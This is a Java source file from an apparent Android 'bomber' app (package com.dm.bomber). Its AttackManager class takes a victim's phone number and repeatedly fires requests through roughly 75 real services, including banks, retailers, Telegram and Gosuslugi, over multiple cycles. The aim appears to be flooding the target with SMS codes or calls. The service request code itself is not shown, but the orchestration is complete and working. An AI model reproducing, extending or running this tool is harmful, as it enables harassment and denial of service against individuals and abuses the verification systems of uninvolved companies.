package com.dm.bomber;

import android.util.Log;

import androidx.annotation.NonNull;

import com.dm.bomber.services.ABank24;
import com.dm.bomber.services.Alltime;
import com.dm.bomber.services.Askona;
import com.dm.bomber.services.AtPrime;
import com.dm.bomber.services.Aushan;
import com.dm.bomber.services.BApteka;
import com.dm.bomber.services.Benzuber;
import com.dm.bomber.services.BudZdorov;
import com.dm.bomber.services.CarSmile;
import com.dm.bomber.services.Citilink;
import com.dm.bomber.services.Citimobil;
import com.dm.bomber.services.EKA;
import com.dm.bomber.services.Eldorado;
import com.dm.bomber.services.Evotor;
import com.dm.bomber.services.Farfor;
import com.dm.bomber.services.Fivepost;
import com.dm.bomber.services.FoodBand;
import com.dm.bomber.services.GloriaJeans;
import com.dm.bomber.services.Gorparkovka;
import com.dm.bomber.services.Gosuslugi;
import com.dm.bomber.services.GreenBee;
import com.dm.bomber.services.HHru;
import com.dm.bomber.services.HiceBank;
import com.dm.bomber.services.Hoff;
import com.dm.bomber.services.ICQ;
import com.dm.bomber.services.Kari;
import com.dm.bomber.services.KazanExpress;
import com.dm.bomber.services.Lenta;
import com.dm.bomber.services.MFC;
import com.dm.bomber.services.MTS;
import com.dm.bomber.services.Magnit;
import com.dm.bomber.services.Mcdonalds;
import com.dm.bomber.services.MegaDisk;
import com.dm.bomber.services.MegafonBank;
import com.dm.bomber.services.MegafonTV;
import com.dm.bomber.services.Modulebank;
import com.dm.bomber.services.Mokka;
import com.dm.bomber.services.Multiplex;
import com.dm.bomber.services.N1RU;
import com.dm.bomber.services.Neftm;
import com.dm.bomber.services.OK;
import com.dm.bomber.services.Okolo;
import com.dm.bomber.services.Olltv;
import com.dm.bomber.services.Ostin;
import com.dm.bomber.services.Ozon;
import com.dm.bomber.services.Plazius;
import com.dm.bomber.services.Premier;
import com.dm.bomber.services.ProstoTV;
import com.dm.bomber.services.Pyaterochka;
import com.dm.bomber.services.RendezVous;
import com.dm.bomber.services.Robocredit;
import com.dm.bomber.services.Samokat;
import com.dm.bomber.services.SberZvuk;
import com.dm.bomber.services.Sephora;
import com.dm.bomber.services.Service;
import com.dm.bomber.services.SimpleWine;
import com.dm.bomber.services.Smotrim;
import com.dm.bomber.services.Sravni;
import com.dm.bomber.services.Stolichki;
import com.dm.bomber.services.SushiWok;
import com.dm.bomber.services.Tele2;
import com.dm.bomber.services.Tele2TV;
import com.dm.bomber.services.Telegram;
import com.dm.bomber.services.Tinder;
import com.dm.bomber.services.Tinkoff;
import com.dm.bomber.services.ToGO;
import com.dm.bomber.services.Uber;
import com.dm.bomber.services.Ukrzoloto;
import com.dm.bomber.services.Verniy;
import com.dm.bomber.services.VoprosRU;
import com.dm.bomber.services.Wink;
import com.dm.bomber.services.Yandex;
import com.dm.bomber.services.YandexEda;
import com.dm.bomber.services.YotaTV;
import com.dm.bomber.services.Zdravcity;
import com.dm.bomber.services.inDriver;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;

import okhttp3.Call;
import okhttp3.Interceptor;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class AttackManager {
    private static final String TAG = "AttackManager";

    private final Service[] services;

    private Attack attack;
    private final Callback callback;

    public AttackManager(Callback callback) {
        Service.client = new OkHttpClient.Builder()
                .addInterceptor(new Interceptor() {
                    @NonNull
                    @Override
                    public Response intercept(@NonNull Chain chain) throws IOException {
                        Request request = chain.request();
                        Log.v(TAG, String.format("Sending request %s", request.url()));

                        Response response = chain.proceed(request);
                        Log.v(TAG, String.format("Received response for %s with status code %s",
                                response.request().url(), response.code()));

                        return response;
                    }
                }).build();

        this.callback = callback;
        this.services = new Service[]{
                new Kari(), new Modulebank(), new YandexEda(), new ICQ(),
                new Citilink(), new GloriaJeans(), new Alltime(), new Mcdonalds(),
                new Telegram(), new AtPrime(), new MTS(), new CarSmile(),
                new Sravni(), new OK(), new SushiWok(), new Tele2(),
                new Eldorado(), new Tele2TV(), new MegafonTV(), new YotaTV(),
                new Fivepost(), new Askona(), new Farfor(), new Sephora(),
                new Ukrzoloto(), new Olltv(), new Wink(), new Lenta(),
                new Pyaterochka(), new ProstoTV(), new Multiplex(), new RendezVous(),
                new Zdravcity(), new Robocredit(), new Yandex(), new MegafonBank(),
                new VoprosRU(), new inDriver(), new Tinder(), new Gosuslugi(),
                new Hoff(), new N1RU(), new Samokat(), new GreenBee(),
                new ToGO(), new Premier(), new Gorparkovka(), new Tinkoff(),
                new MegaDisk(), new KazanExpress(), new BudZdorov(), new FoodBand(),
                new Benzuber(), new Verniy(), new Citimobil(), new HHru(),
                new Ozon(), new Aushan(), new Uber(), new MFC(),
                new Ostin(), new EKA(), new Neftm(), new Plazius(),
                new Okolo(), new Magnit(), new SberZvuk(), new Smotrim(),
                new Mokka(), new SimpleWine(), new ABank24(), new Stolichki(),
                new BApteka(), new HiceBank(), new Evotor()
        };
    }

    public void performAttack(String phoneCode, String phone, int cycles) {
        attack = new Attack(phoneCode, phone, cycles);
        attack.start();
    }

    public boolean hasAttack() {
        return attack != null && attack.isAlive();
    }

    public void stopAttack() {
        attack.interrupt();
        Service.client.dispatcher().cancelAll();
    }

    public List<Service> getUsableServices(String phoneCode) {
        List<Service> usableServices = new ArrayList<>();

        for (Service service : services) {
            if (service.requireCode == null || service.requireCode.equals(phoneCode))
                usableServices.add(service);
        }

        return usableServices;
    }

    public interface Callback {
        void onAttackEnd();

        void onAttackStart(int serviceCount, int numberOfCycles);

        void onProgressChange(int progress);
    }

    private class Attack extends Thread {
        private final String phoneCode;
        private final String phone;
        private final int numberOfCycles;

        private int progress = 0;

        private CountDownLatch tasks;

        public Attack(String phoneCode, String phone, int cycles) {
            super(phone);

            this.phoneCode = phoneCode;
            this.phone = phone;
            this.numberOfCycles = cycles;
        }

        @Override
        public void run() {
            List<Service> usableServices = getUsableServices(phoneCode);

            callback.onAttackStart(usableServices.size(), numberOfCycles);
            Log.i(TAG, String.format("Starting attack on +%s%s", phoneCode, phone));

            for (int cycle = 0; cycle < numberOfCycles; cycle++) {
                Log.i(TAG, String.format("Started cycle %s", cycle));

                tasks = new CountDownLatch(usableServices.size());

                for (Service service : usableServices) {
                    service.prepare(phoneCode, phone);
                    service.run(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NotNull Call call, @NotNull IOException e) {
                            Log.e(TAG, String.format("%s returned error", service.getClass().getName()), e);

                            tasks.countDown();
                            callback.onProgressChange(progress++);
                        }

                        @Override
                        public void onResponse(@NotNull Call call, @NotNull Response response) {
                            if (!response.isSuccessful()) {
                                Log.i(TAG, String.format("%s returned an error HTTP code: %s",
                                        service.getClass().getName(), response.code()));
                            }

                            tasks.countDown();
                            callback.onProgressChange(progress++);
                        }
                    });
                }

                try {
                    tasks.await();
                } catch (InterruptedException e) {
                    break;
                }
            }

            callback.onAttackEnd();
            Log.i(TAG, String.format("Attack on +%s%s ended", phoneCode, phone));
        }
    }
}
